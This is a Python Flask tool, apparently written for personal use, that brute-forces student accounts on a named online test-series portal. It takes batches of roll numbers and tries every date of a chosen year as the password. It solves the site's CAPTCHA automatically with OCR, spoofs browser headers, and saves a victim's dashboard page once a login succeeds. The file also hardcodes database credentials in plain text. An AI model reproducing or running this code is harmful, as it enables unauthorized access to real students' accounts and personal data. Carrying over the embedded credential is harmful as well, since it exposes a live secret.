#!/usr/bin/env python3
"""
Motion OTS Brute‑Force Dashboard – One‑by‑One with Delays & MongoDB Persistence
Author: Potato
Features:
- MongoDB for persistent job state (auto‑resume on restart)
- Batch processing: add multiple roll numbers at once
- Each roll number gets its own job with separate logs
- ddddocr CAPTCHA solver, configurable delays, retries
- Flask web dashboard with live logs
- Stop job functionality
- DELETE individual jobs and DELETE all jobs (with proper thread termination)
"""

import os
import sys
import time
import uuid
import json
import threading
import queue
import asyncio
import aiohttp
from bs4 import BeautifulSoup
import re
from datetime import datetime, timedelta
import traceback
from flask import Flask, render_template_string, request, jsonify, g

# MongoDB
import pymongo
from pymongo import MongoClient, errors

# ----------------------------------------------------------------------
# CONFIGURATION
# ----------------------------------------------------------------------
DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds
MAX_RETRIES_PER_PASSWORD = 3
CONCURRENT_WORKERS = 1
CAPTCHA_FETCH_TIMEOUT = 8
LOGIN_TIMEOUT = 12
POLLING_INTERVAL = 1.5

# MongoDB URI
MONGO_URI = "mongodb+srv://Nischay999:Nischay999@cluster0.5kufo.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "ny_brute_db"
COLLECTION_NAME = "jobs"

# ----------------------------------------------------------------------
# OCR SETUP (ddddocr)
# ----------------------------------------------------------------------
try:
    import ddddocr
    ocr = ddddocr.DdddOcr(ocr=True, det=False)
    OCR_OK = True
    print("✅ ddddocr initialized successfully")
except ImportError:
    OCR_OK = False
    print("❌ ddddocr not installed. Run: pip install ddddocr")
    sys.exit(1)
except Exception as e:
    OCR_OK = False
    print(f"❌ ddddocr initialization failed: {e}")
    sys.exit(1)

# Optional Tesseract fallback
try:
    import pytesseract
    pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
    TESSERACT_OK = True
except:
    TESSERACT_OK = False

def solve_captcha_image(img_bytes, log_queue=None):
    try:
        result = ocr.classification(img_bytes)
        if result:
            cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
            if len(result) >= 4:
                return result[:6]
        if TESSERACT_OK:
            from PIL import Image
            from io import BytesIO
            img = Image.open(BytesIO(img_bytes))
            img = img.convert('L')
            img = img.point(lambda p: 0 if p < 140 else 255, '1')
            custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            text = pytesseract.image_to_string(img, config=custom_config)
            cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
            if len(cleaned) >= 4:
                return cleaned[:6]
        return None
    except Exception as e:
        if log_queue:
            log_queue.put_nowait(f"❌ OCR error: {str(e)}")
        return None

# ----------------------------------------------------------------------
# MONGODB SETUP
# ----------------------------------------------------------------------
try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    mongo_client.server_info()
    db = mongo_client[DB_NAME]
    jobs_collection = db[COLLECTION_NAME]
    print("✅ Connected to MongoDB")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    sys.exit(1)

# ----------------------------------------------------------------------
# JOB CLASS (with MongoDB persistence)
# ----------------------------------------------------------------------
class BruteJob:
    """
    A brute‑force job that runs in a background thread.
    Persists state in MongoDB so it can resume after a restart.
    """

    def __init__(self, job_id, user_id, year, status='idle', password=None,
                 logs=None, passwords_to_try=None, current_index=0,
                 start_time=None, end_time=None, created_at=None):
        self.job_id = job_id
        self.user_id = user_id
        self.year = year
        self.status = status          # idle, running, success, failed, stopped
        self.password = password
        self.logs = logs if logs is not None else []
        self.passwords_to_try = passwords_to_try if passwords_to_try is not None else []
        self.current_index = current_index
        self.start_time = start_time
        self.end_time = end_time
        self.created_at = created_at or datetime.utcnow().isoformat()

        self.thread = None
        self.stop_flag = False
        self.deleted = False          # mark as deleted to prevent further saves
        self.log_queue = queue.Queue()
        self.total_passwords = len(self.passwords_to_try)

    @classmethod
    def from_db_doc(cls, doc):
        """Create a BruteJob from a MongoDB document."""
        job = cls(
            job_id=doc['job_id'],
            user_id=doc['user_id'],
            year=doc['year'],
            status=doc.get('status', 'idle'),
            password=doc.get('password'),
            logs=doc.get('logs', []),
            passwords_to_try=doc.get('passwords_to_try', []),
            current_index=doc.get('current_index', 0),
            start_time=doc.get('start_time'),
            end_time=doc.get('end_time'),
            created_at=doc.get('created_at')
        )
        return job

    def to_db_doc(self):
        """Convert job to a MongoDB document."""
        return {
            'job_id': self.job_id,
            'user_id': self.user_id,
            'year': self.year,
            'status': self.status,
            'password': self.password,
            'logs': self.logs,
            'passwords_to_try': self.passwords_to_try,
            'current_index': self.current_index,
            'start_time': self.start_time,
            'end_time': self.end_time,
            'created_at': self.created_at,
        }

    def save_to_db(self):
        """Save or update the job in MongoDB, but skip if deleted."""
        if self.deleted:
            return
        try:
            jobs_collection.update_one(
                {'job_id': self.job_id},
                {'$set': self.to_db_doc()},
                upsert=True
            )
        except Exception as e:
            print(f"Error saving job {self.job_id}: {e}")

    @staticmethod
    def load_from_db(job_id):
        """Load a job from MongoDB by job_id."""
        doc = jobs_collection.find_one({'job_id': job_id})
        if doc:
            return BruteJob.from_db_doc(doc)
        return None

    @staticmethod
    def load_all_jobs():
        """Load all jobs from MongoDB."""
        docs = jobs_collection.find().sort('created_at', pymongo.DESCENDING)
        return [BruteJob.from_db_doc(doc) for doc in docs]

    def start(self):
        """Start the brute‑force thread if not already running."""
        if self.thread and self.thread.is_alive():
            return
        self.status = 'running'
        self.start_time = datetime.utcnow().isoformat()
        self.stop_flag = False
        self.deleted = False
        self.save_to_db()
        self.thread = threading.Thread(target=self._run)
        self.thread.daemon = True
        self.thread.start()

    def _run(self):
        """Entry point for the background thread."""
        try:
            asyncio.run(self._async_bruteforce())
        except Exception as e:
            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
        finally:
            # Only save if not deleted
            if not self.deleted:
                if self.status != 'stopped':
                    self.status = 'success' if self.password else 'failed'
                self.end_time = datetime.utcnow().isoformat()
                self.save_to_db()
            else:
                # Ensure we don't leave any log messages behind
                while not self.log_queue.empty():
                    try:
                        self.log_queue.get_nowait()
                    except:
                        break

    async def _async_bruteforce(self):
        """Main async loop: process passwords from current_index to end."""
        log_queue = self.log_queue
        user_id = self.user_id
        year = self.year

        if not self.passwords_to_try:
            start_date = datetime(year, 1, 1)
            end_date = datetime(year, 12, 31)
            dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
            self.passwords_to_try = [d.strftime("%d-%m-%Y") for d in dates]
            self.total_passwords = len(self.passwords_to_try)
            self.save_to_db()
            log_queue.put_nowait(f"🚀 Generated {self.total_passwords} passwords for {year}")

        log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} (total: {self.total_passwords})")
        log_queue.put_nowait(f"⏱️  Delay: {DELAY_BETWEEN_ATTEMPTS}s, retries: {MAX_RETRIES_PER_PASSWORD}")
        if self.current_index > 0:
            log_queue.put_nowait(f"⏩ Resuming from password {self.current_index+1}/{self.total_passwords}")

        connector = aiohttp.TCPConnector(limit=CONCURRENT_WORKERS, limit_per_host=CONCURRENT_WORKERS)
        timeout = aiohttp.ClientTimeout(total=20, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(CONCURRENT_WORKERS)
            result_queue = asyncio.Queue()
            stop_event = asyncio.Event()

            tasks = []
            for idx in range(self.current_index, self.total_passwords):
                if self.stop_flag or self.deleted:
                    break
                password = self.passwords_to_try[idx]
                tasks.append(asyncio.create_task(
                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue, idx)
                ))

            found = None
            session_obj = None
            while not self.stop_flag and not self.deleted:
                try:
                    found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                    break
                except asyncio.TimeoutError:
                    if all(t.done() for t in tasks):
                        break
            # Cancel remaining tasks
            for t in tasks:
                t.cancel()

            if found:
                self.password = found
                log_queue.put_nowait(f"🎉 Password found: {found}")
                if session_obj:
                    try:
                        dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
                        if dash.status == 200:
                            with open(f"dashboard_{user_id}.html", "w") as f:
                                f.write(await dash.text())
                            log_queue.put_nowait("💾 Dashboard HTML saved.")
                    except Exception as e:
                        log_queue.put_nowait(f"⚠️ Dashboard save error: {e}")
            else:
                if not self.stop_flag and not self.deleted:
                    log_queue.put_nowait("❌ No password found in that year.")

    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue, idx):
        if self.stop_flag or self.deleted:
            return
        async with semaphore:
            self.current_index = idx
            progress_msg = f"Progress: {idx+1}/{self.total_passwords} ({(idx+1)/self.total_passwords*100:.1f}%)"
            log_queue.put_nowait(f"⏳ Attempting {password}  [{progress_msg}]")

            for attempt in range(MAX_RETRIES_PER_PASSWORD):
                if self.stop_flag or self.deleted:
                    return
                try:
                    captcha = await self._fetch_captcha(session, log_queue)
                    if not captcha:
                        log_queue.put_nowait(f"⏭️  No CAPTCHA for {password} (attempt {attempt+1})")
                        continue
                    log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")

                    success, response = await self._try_login(session, user_id, password, captcha, log_queue)
                    if success:
                        log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
                        result_queue.put_nowait((password, session))
                        stop_event.set()
                        self.current_index = idx + 1
                        self.save_to_db()
                        return

                    if response in ("captcha_error", "redirect_failure", "timeout"):
                        log_queue.put_nowait(f"🔄 Retry‑able ({response}) – attempt {attempt+1}/{MAX_RETRIES_PER_PASSWORD}")
                        await asyncio.sleep(1.0)
                        continue
                    else:
                        log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
                        break
                except asyncio.TimeoutError:
                    log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
                    await asyncio.sleep(1.0)
                    continue
                except Exception as e:
                    log_queue.put_nowait(f"❌ Worker error: {str(e)}")
                    break

            # Update progress after finishing this password
            self.current_index = idx + 1
            self.save_to_db()
            log_queue.put_nowait(f"⏭️  Giving up on {password} after {MAX_RETRIES_PER_PASSWORD} attempts")

            if not self.stop_flag and not self.deleted:
                log_queue.put_nowait(f"⏱️  Waiting {DELAY_BETWEEN_ATTEMPTS}s before next attempt...")
                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)

    async def _fetch_captcha(self, session, log_queue):
        for attempt in range(3):
            if self.stop_flag or self.deleted:
                return None
            try:
                rand = int(time.time() * 1000) + attempt + os.getpid()
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=CAPTCHA_FETCH_TIMEOUT)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        if len(img_bytes) < 100:
                            await asyncio.sleep(0.2)
                            continue
                        loop = asyncio.get_running_loop()
                        captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                        if captcha:
                            return captcha
                    await asyncio.sleep(0.3)
            except asyncio.TimeoutError:
                log_queue.put_nowait("⏰ CAPTCHA fetch timeout")
            except Exception as e:
                log_queue.put_nowait(f"⚠️ CAPTCHA error: {e}")
        return None

    async def _try_login(self, session, user_id, password, captcha, log_queue):
        data = {
            "login_username": user_id,
            "login_password": password,
            "captcha": captcha,
            "login": ""
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://onlinetestseries.motion.ac.in/",
        }
        try:
            async with session.post(
                "https://onlinetestseries.motion.ac.in/login.php",
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=LOGIN_TIMEOUT)
            ) as resp:
                if self.stop_flag or self.deleted:
                    return False, "aborted"
                if resp.status == 302:
                    location = resp.headers.get("Location", "")
                    if "dashboard/student-dashboard.php" in location:
                        return True, None
                    else:
                        return False, "redirect_failure"
                elif resp.status == 200:
                    text = await resp.text()
                    soup = BeautifulSoup(text, "html.parser")
                    err = soup.find("div", class_="alertmsg")
                    if err:
                        err_text = err.text.strip()
                        if "CAPTCHA" in err_text or "captcha" in err_text:
                            return False, "captcha_error"
                        else:
                            return False, err_text[:100]
                    else:
                        if "dashboard" in text.lower() or "logout" in text.lower():
                            return True, None
                        return False, "unknown_failure"
                else:
                    return False, f"HTTP {resp.status}"
        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            return False, f"Exception: {e}"

    def stop(self):
        self.stop_flag = True
        self.status = 'stopped'
        self.save_to_db()  # will be skipped if deleted

    def get_updates(self):
        new_logs = []
        while not self.log_queue.empty():
            try:
                msg = self.log_queue.get_nowait()
                self.logs.append(msg)
                new_logs.append(msg)
                if "SUCCESS" in msg or "Password found" in msg:
                    if "Password =" in msg:
                        self.password = msg.split("Password =")[-1].strip()
                    self.status = 'success'
                if len(self.logs) % 5 == 0:
                    self.save_to_db()  # skipped if deleted
            except:
                break
        if new_logs:
            self.save_to_db()  # skipped if deleted
        return new_logs


# ----------------------------------------------------------------------
# FLASK WEB APPLICATION
# ----------------------------------------------------------------------
app = Flask(__name__)
app.secret_key = 'supersecretkey-change-this-in-production'
jobs = {}  # in‑memory cache of BruteJob objects

def load_jobs_from_db():
    global jobs
    job_list = BruteJob.load_all_jobs()
    jobs = {job.job_id: job for job in job_list}
    print(f"📂 Loaded {len(jobs)} jobs from MongoDB.")
    for job_id, job in jobs.items():
        if job.status == 'running':
            print(f"🔄 Resuming job {job_id} for user {job.user_id}")
            job.start()


@app.route('/')
def index():
    HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Motion Brute‑Force Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
        h1 { color: #58a6ff; }
        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-start; }
        .form-group label { font-weight: bold; min-width: 80px; padding-top: 8px; }
        .form-group textarea, .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
        .form-group textarea { height: 100px; resize: vertical; }
        .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .btn-start { background: #238636; color: #fff; }
        .btn-start:hover { background: #2ea043; }
        .btn-stop { background: #da3633; color: #fff; }
        .btn-stop:hover { background: #f85149; }
        .btn-danger { background: #da3633; color: #fff; }
        .btn-danger:hover { background: #f85149; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .logs-box { background: #0d1117; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; white-space: pre-wrap; margin-top: 10px; }
        .log-entry { border-bottom: 1px solid #21262d; padding: 3px 0; }
        .success { color: #3fb950; }
        .error { color: #f85149; }
        .info { color: #58a6ff; }
        .status-bar { padding: 10px; background: #0d1117; border-radius: 6px; margin: 10px 0; }
        .job-list { margin-top: 20px; }
        .job-item { background: #0d1117; padding: 10px; border-radius: 6px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .job-status { font-weight: bold; }
        .job-status.running { color: #58a6ff; }
        .job-status.success { color: #3fb950; }
        .job-status.failed { color: #f85149; }
        .job-status.stopped { color: #d29922; }
        .job-status.idle { color: #8b949e; }
        .job-actions a { color: #58a6ff; margin-left: 10px; cursor: pointer; }
        .help-text { color: #8b949e; font-size: 0.9em; margin-top: 5px; }
        .job-actions .delete { color: #f85149; }
        .job-actions .delete:hover { text-decoration: underline; }
        .btn-delete-all { background: #da3633; color: #fff; margin-left: 10px; }
        .btn-delete-all:hover { background: #f85149; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>🚀 Motion OTS Brute‑Forcer</h1>
        <p>Enter user IDs (one per line) and a year to test all dates as passwords.</p>
        <p class="help-text">⏱️  One password at a time with a delay between attempts to avoid rate‑limiting.</p>
        <form id="bruteForm">
            <div class="form-group">
                <label for="user_ids">User IDs</label>
                <textarea id="user_ids" placeholder="e.g.&#10;26173000005&#10;26173000006" required></textarea>
            </div>
            <div class="form-group">
                <label for="year">Year</label>
                <input type="number" id="year" placeholder="e.g. 2009" min="1900" max="2100" required>
            </div>
            <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                <button type="submit" class="btn btn-start" id="startBtn">▶ Start Brute‑Force</button>
                <button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
            </div>
        </form>
        <div class="status-bar">
            <span id="status-text">Idle</span>
            <span id="password-result"></span>
        </div>
        <div id="logs" class="logs-box">Waiting for logs...</div>
    </div>
    <div class="card">
        <h2>📋 All Jobs
            <button class="btn btn-delete-all" id="deleteAllBtn" onclick="deleteAllJobs()">Delete All</button>
        </h2>
        <div id="jobList" class="job-list"></div>
    </div>
</div>
<script>
    let jobId = null;
    let pollInterval = null;
    const logsDiv = document.getElementById('logs');
    const statusText = document.getElementById('status-text');
    const passwordResult = document.getElementById('password-result');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const jobListDiv = document.getElementById('jobList');

    document.getElementById('bruteForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user_ids = document.getElementById('user_ids').value.trim();
        const year = document.getElementById('year').value.trim();
        if (!user_ids || !year) return alert('Please fill all fields.');
        startBtn.disabled = true;
        stopBtn.disabled = false;
        logsDiv.innerHTML = '';
        statusText.innerText = 'Starting...';
        passwordResult.innerText = '';
        const formData = new FormData();
        formData.append('user_ids', user_ids);
        formData.append('year', year);
        try {
            const resp = await fetch('/start', { method: 'POST', body: formData });
            const data = await resp.json();
            if (data.error) {
                alert(data.error);
                resetUI();
                return;
            }
            jobId = data.job_ids[0];
            statusText.innerText = `Started ${data.job_ids.length} job(s)`;
            if (pollInterval) clearInterval(pollInterval);
            pollInterval = setInterval(pollStatus, 1500);
            loadJobs();
        } catch (err) {
            alert('Error starting job: ' + err.message);
            resetUI();
        }
    });

    stopBtn.addEventListener('click', async () => {
        if (!jobId) return;
        try {
            await fetch(`/stop/${jobId}`, { method: 'POST' });
            statusText.innerText = 'Stopped by user';
            stopBtn.disabled = true;
            startBtn.disabled = false;
            if (pollInterval) clearInterval(pollInterval);
            loadJobs();
        } catch (err) {
            alert('Stop error: ' + err.message);
        }
    });

    async function pollStatus() {
        if (!jobId) return;
        try {
            const resp = await fetch(`/status/${jobId}`);
            const data = await resp.json();
            if (data.error) {
                console.error(data.error);
                clearInterval(pollInterval);
                resetUI();
                return;
            }
            if (data.new_logs && data.new_logs.length > 0) {
                data.new_logs.forEach(msg => {
                    const div = document.createElement('div');
                    div.className = 'log-entry';
                    if (msg.includes('SUCCESS') || msg.includes('Password found')) {
                        div.classList.add('success');
                    } else if (msg.includes('❌') || msg.includes('Error')) {
                        div.classList.add('error');
                    } else {
                        div.classList.add('info');
                    }
                    div.textContent = msg;
                    logsDiv.appendChild(div);
                    logsDiv.scrollTop = logsDiv.scrollHeight;
                });
            }
            if (data.status === 'success') {
                statusText.innerText = '✅ Success!';
                passwordResult.innerText = `🎉 Password: ${data.password}`;
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'failed') {
                statusText.innerText = '❌ Failed – no password found.';
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'stopped') {
                statusText.innerText = '⏹ Stopped.';
                stopBtn.disabled = true;
                startBtn.disabled = false;
                clearInterval(pollInterval);
                loadJobs();
            } else if (data.status === 'running') {
                statusText.innerText = '🔄 Running...';
            }
        } catch (err) {
            console.error('Poll error:', err);
        }
    }

    async function loadJobs() {
        try {
            const resp = await fetch('/jobs');
            const data = await resp.json();
            if (data.jobs) {
                jobListDiv.innerHTML = data.jobs.map(j => `
                    <div class="job-item">
                        <div>
                            <strong>${j.user_id}</strong> (${j.year})
                            <span class="job-status ${j.status}">${j.status.toUpperCase()}</span>
                            ${j.password ? `🔑 ${j.password}` : ''}
                            <span style="font-size:0.8em;color:#8b949e;">${j.created_at}</span>
                        </div>
                        <div class="job-actions">
                            <a onclick="viewJob('${j.job_id}')">View Logs</a>
                            ${j.status === 'running' ? `<a onclick="stopJob('${j.job_id}')">Stop</a>` : ''}
                            <a class="delete" onclick="deleteJob('${j.job_id}')">Delete</a>
                        </div>
                    </div>
                `).join('');
            }
        } catch(err) { console.error(err); }
    }

    async function viewJob(jid) {
        const resp = await fetch(`/status/${jid}`);
        const data = await resp.json();
        if (data.logs) {
            logsDiv.innerHTML = data.logs.map(msg => `<div class="log-entry">${msg}</div>`).join('');
            statusText.innerText = `Job ${jid} (${data.status})`;
            passwordResult.innerText = data.password ? `Password: ${data.password}` : '';
            jobId = jid;
        }
    }

    async function stopJob(jid) {
        if (!confirm('Stop this job?')) return;
        try {
            await fetch(`/stop/${jid}`, { method: 'POST' });
            loadJobs();
        } catch(err) { alert(err.message); }
    }

    async function deleteJob(jid) {
        if (!confirm(`Delete job ${jid}? This action cannot be undone.`)) return;
        try {
            const resp = await fetch(`/job/${jid}`, { method: 'DELETE' });
            if (resp.ok) {
                alert('Job deleted.');
                if (jobId === jid) {
                    resetUI();
                    logsDiv.innerHTML = 'Job deleted.';
                    statusText.innerText = 'Idle';
                    passwordResult.innerText = '';
                }
                loadJobs();
            } else {
                const data = await resp.json();
                alert('Error: ' + (data.error || 'Unknown'));
            }
        } catch(err) { alert(err.message); }
    }

    async function deleteAllJobs() {
        if (!confirm('Delete ALL jobs? This action cannot be undone.')) return;
        try {
            const resp = await fetch('/jobs/all', { method: 'DELETE' });
            if (resp.ok) {
                alert('All jobs deleted.');
                resetUI();
                logsDiv.innerHTML = 'All jobs deleted.';
                statusText.innerText = 'Idle';
                passwordResult.innerText = '';
                loadJobs();
            } else {
                const data = await resp.json();
                alert('Error: ' + (data.error || 'Unknown'));
            }
        } catch(err) { alert(err.message); }
    }

    function resetUI() {
        startBtn.disabled = false;
        stopBtn.disabled = true;
        if (pollInterval) clearInterval(pollInterval);
        jobId = null;
    }

    // Load jobs on page load
    loadJobs();
</script>
</body>
</html>
    '''
    return render_template_string(HTML)


@app.route('/start', methods=['POST'])
def start_job():
    user_ids_raw = request.form.get('user_ids')
    year_str = request.form.get('year')
    if not user_ids_raw or not year_str:
        return jsonify({'error': 'Missing user_ids or year'}), 400
    try:
        year = int(year_str)
    except:
        return jsonify({'error': 'Year must be integer'}), 400

    user_ids = [uid.strip() for uid in user_ids_raw.splitlines() if uid.strip()]
    if not user_ids:
        return jsonify({'error': 'No valid user IDs provided'}), 400

    created_job_ids = []
    for uid in user_ids:
        job_id = str(uuid.uuid4())
        job = BruteJob(job_id, uid, year)
        job.save_to_db()
        jobs[job_id] = job
        job.start()
        created_job_ids.append(job_id)

    return jsonify({'job_ids': created_job_ids, 'count': len(created_job_ids)})


@app.route('/status/<job_id>')
def status(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    new_logs = job.get_updates()
    return jsonify({
        'status': job.status,
        'password': job.password,
        'logs': job.logs,
        'new_logs': new_logs,
    })


@app.route('/stop/<job_id>', methods=['POST'])
def stop_job(job_id):
    job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    job.stop()
    return jsonify({'status': 'stopped'})


@app.route('/job/<job_id>', methods=['DELETE'])
def delete_job(job_id):
    """Delete a specific job from MongoDB and in-memory cache with retries."""
    job = jobs.get(job_id)
    if job:
        # 1. Mark as deleted – this makes save_to_db() a no-op
        job.deleted = True
        # 2. Stop the thread (stop() will call save_to_db() but it will be skipped)
        if job.status == 'running':
            job.stop()
        # 3. Clear the log queue to prevent any pending saves
        while not job.log_queue.empty():
            try:
                job.log_queue.get_nowait()
            except:
                break
        # 4. Remove from in-memory dict
        del jobs[job_id]
        print(f"🗑️ Marked job {job_id} as deleted, removed from memory.")

    # 5. Delete from MongoDB with retries and verification
    max_retries = 3
    for attempt in range(max_retries):
        try:
            result = jobs_collection.delete_one({'job_id': job_id})
            if result.deleted_count > 0:
                print(f"✅ Deleted job {job_id} from MongoDB (attempt {attempt+1})")
                # Verify it's really gone
                verify = jobs_collection.find_one({'job_id': job_id})
                if verify is None:
                    return jsonify({'message': 'Job deleted successfully'})
                else:
                    print(f"⚠️ Job {job_id} still exists after delete, retrying...")
                    continue
            else:
                print(f"⚠️ Job {job_id} not found in MongoDB (attempt {attempt+1})")
                # It might already be deleted, so we consider it success
                return jsonify({'message': 'Job already deleted'})
        except Exception as e:
            print(f"❌ MongoDB delete attempt {attempt+1} failed for {job_id}: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)  # wait before retry
            else:
                return jsonify({'error': f'Database error after {max_retries} attempts: {str(e)}'}), 500

    return jsonify({'error': 'Failed to delete job after multiple attempts'}), 500


@app.route('/jobs/all', methods=['DELETE'])
def delete_all_jobs():
    """Delete all jobs from MongoDB and in-memory cache."""
    # Mark all as deleted and stop threads
    for job_id, job in list(jobs.items()):
        job.deleted = True
        if job.status == 'running':
            job.stop()
        while not job.log_queue.empty():
            try:
                job.log_queue.get_nowait()
            except:
                break
    jobs.clear()
    print("🗑️ All jobs marked as deleted and removed from memory.")

    # Delete all from MongoDB with retry
    max_retries = 3
    for attempt in range(max_retries):
        try:
            result = jobs_collection.delete_many({})
            print(f"✅ Deleted {result.deleted_count} jobs from MongoDB (attempt {attempt+1})")
            return jsonify({'message': f'Deleted {result.deleted_count} jobs'})
        except Exception as e:
            print(f"❌ MongoDB delete all attempt {attempt+1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return jsonify({'error': f'Database error after {max_retries} attempts: {str(e)}'}), 500

    return jsonify({'error': 'Failed to delete all jobs'}), 500


@app.route('/jobs')
def list_jobs():
    job_list = BruteJob.load_all_jobs()
    return jsonify({'jobs': [
        {
            'job_id': j.job_id,
            'user_id': j.user_id,
            'year': j.year,
            'status': j.status,
            'password': j.password,
            'created_at': j.created_at
        } for j in job_list
    ]})


@app.route('/test-password', methods=['POST'])
async def test_password():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'JSON body required'}), 400

    user_id = data.get('user_id')
    password = data.get('password')
    captcha = data.get('captcha')

    if not user_id or not password:
        return jsonify({'error': 'user_id and password required'}), 400

    if not captcha:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for attempt in range(3):
                rand = int(time.time() * 1000) + attempt
                url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                async with session.get(url) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        captcha = solve_captcha_image(img_bytes, None)
                        if captcha:
                            break
            if not captcha:
                return jsonify({'error': 'Could not fetch CAPTCHA'}), 400

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html",
        "Referer": "https://onlinetestseries.motion.ac.in/",
    }
    login_data = {
        "login_username": user_id,
        "login_password": password,
        "captcha": captcha,
        "login": ""
    }
    try:
        connector = aiohttp.TCPConnector(limit=1)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.post(
                "https://onlinetestseries.motion.ac.in/login.php",
                data=login_data,
                headers=headers,
                allow_redirects=False
            ) as resp:
                result = {
                    'status': resp.status,
                    'headers': dict(resp.headers),
                }
                if resp.status == 302:
                    result['location'] = resp.headers.get('Location')
                else:
                    text = await resp.text()
                    result['body_preview'] = text[:500]
                return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ----------------------------------------------------------------------
# STARTUP
# ----------------------------------------------------------------------
if __name__ == '__main__':
    load_jobs_from_db()
    app.run(debug=False, host='0.0.0.0', port=5000)
else:
    load_jobs_from_db()
